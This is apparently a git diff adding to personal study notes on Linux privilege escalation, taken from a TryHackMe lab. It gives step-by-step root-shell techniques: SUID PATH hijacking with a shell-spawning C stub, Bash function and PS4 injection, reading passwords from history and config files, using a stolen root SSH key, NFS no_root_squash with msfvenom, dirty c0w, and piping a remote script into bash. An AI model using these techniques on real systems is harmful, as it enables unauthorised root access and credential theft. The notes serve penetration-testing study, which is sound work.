@@ -1,6 +1,13 @@
 https://tryhackme.com/room/linuxprivesc
 # Enumerate
 
+### Find all SUID/GUID executables
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+OR
+`find / -perm /4000 2> /dev/null`
+OR
+`find / -user root -perm -4000 -exec ls -ldb {} \;
+### SSH Keys
 On Linux ideally we would be looking for opportunities to gain access to a user account. 
 SSH keys stored at `/home/<user>/.ssh` 
 
@@ -10,6 +17,27 @@ Some exploits will also allow you to add your own account. In particular somethi
 
 shows current users permissions
 `sudo -l
+
+### Open Root Shell
+
+use `/bin/bash -p`
+
+## LSE.sh
+
+Linux Smart Enumeration Tool
+https://github.com/diego-treitos/linux-smart-enumeration
+
+Direct execution oneliners
+
+```shell
+bash <(wget -q -O - "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh") -l2 -i
+```
+
+```shell
+bash <(curl -s "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh") -l1 -i
+```
+
+
 
 
 ## LinPEAS
@@ -98,6 +126,84 @@ void inject() {
 4. Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.
 `/usr/local/bin/suid-so`
 
+### SUID / SGID Executables - Environment Variables
+
+```shell
+user@debian:~$ cat /etc/crontab
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+
+1. First, execute the file and note that it seems to be trying to start the apache2 webserver:
+`/usr/local/bin/suid-env`
+2. Run strings on the file to look for strings of printable characters:
+`strings /usr/local/bin/suid-env`
+3. One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+4. Create a file called service. This code simply spawns a Bash shell:
+```c
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+5. compile program `gcc -o service /home/user/tools/suid/service.c
+6. Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+`PATH=.:$PATH /usr/local/bin/suid-env`
+
+### SUID / SGID Executables - Abusing Shell Features
+
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+Verify this with strings:
+`strings /usr/local/bin/suid-env2   `
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+`/bin/bash --version`
+
+1. Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+`function /usr/sbin/service { /bin/bash -p; }   
+`export -f /usr/sbin/service`
+2. Run the suid-env2 executable to gain a root shell:
+`/usr/local/bin/suid-env2`
+
+### SUID / SGID Executables - Abusing Shell Features (#2)
+
+>**Note:** This will not work on Bash versions 4.4 and above.
+
+1. Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
+2. Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+`/tmp/rootbash -p`
+
+## Passwords & Keys - Files
+
+### History
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+`cat ~/.*history | less`
+
+### Misc Config Files
+Config files often contain passwords in plaintext or other reversible formats.
+List the contents of the user's home directory:
+`ls /home/user`
+Note the presence of a **myvpn.ovpn** config file. View the contents of the file:
+`cat /home/user/myvpn.ovpn`
+The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+`su root`
+
+### SSH Keys
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
+1. Look for hidden files & directories in the system root:
+`ls -la /`
+Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:
+`ls -l /.ssh`
+2. Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+`chmod 600 root_key`
+3. Use the key to ssh as the root account (note that due to the age of the box, some additional settings are required when using SSH):
+`ssh -i root_key root@10.10.69.9`
 
 
 
@@ -191,7 +297,7 @@ tar czf /tmp/backup.tar.gz *
 touch /home/user/--checkpoint=1   
 touch /home/user/--checkpoint-action=exec=shell.elf
 ```
-When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+When the tar command in the cron job runs, the wildcard will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
 5. Set up a netcat listener and wait for the cronjob to run `nc -nvlp 4444`
 
 
@@ -290,6 +396,65 @@ https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences
 `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
 7. Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
 `sudo LD_LIBRARY_PATH=/tmp apache2`
+
+## NFS
+
+### NFS shares
+
+1. shows visible NFS shares on that IP 
+    ```
+     showmount -e [IP]
+    ```
+2. mounts the share from "IP:share" to the directory "/tmp/mount"
+    ```
+    sudo mount -t nfs IP:share /tmp/mount/ -nolock
+    ```
+3. Download Bash executable  
+```
+get https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -P ~/Downloads
+```
+4. Copy it to the NFS mount poin
+```
+cp ~/Downloads/bash ~/share
+```
+5. Step Change its permissions    
+```
+sudo chmod +s bash
+sudo chmod +x bash
+file should have "-rwsr-sr-x" as permissions
+```
+6. ssh into the machine that now holds the bash executable and run the executable using
+```
+./bash -p
+```
+7. You should now have a shell as "root"
+
+### NFS NFS Files
+
+Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+1. Check the NFS share configuration on the Debian VM:
+`cat /etc/exports`
+Note that the **/tmp** share has root squashing disabled.
+`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
+2. On your Kali box, switch to your root user if you are not already running as root:
+`sudo su`
+3. Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):
+`mkdir /tmp/nfs   mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
+4. Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):
+`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
+5. Still using Kali's root user, make the file executable and set the SUID permission:
+`chmod +xs /tmp/nfs/shell.elf`
+
+
+### Kernel Exploits
+
+1. Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:
+`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
+2. Compile the code and run the dirty c0w exploit (note that it may take several minutes to complete):
+`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w   ./c0w`
+3. Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+`/usr/bin/passwd`
 
 
 
